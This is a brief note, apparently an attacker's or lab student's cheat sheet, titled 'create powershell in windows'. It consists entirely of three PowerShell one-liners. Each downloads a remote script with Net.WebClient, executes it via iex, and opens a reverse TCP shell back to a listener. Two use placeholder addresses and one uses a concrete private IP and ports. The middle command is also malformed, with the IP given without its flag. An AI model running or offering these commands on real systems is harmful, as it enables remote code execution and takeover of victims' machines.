
create powershell in windows

 powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port_
 
  powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.249.117:8081/psh.ps1');psh.ps1 -Reverse -10.8.249.117 -Port 4443
  
  
  powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port_
 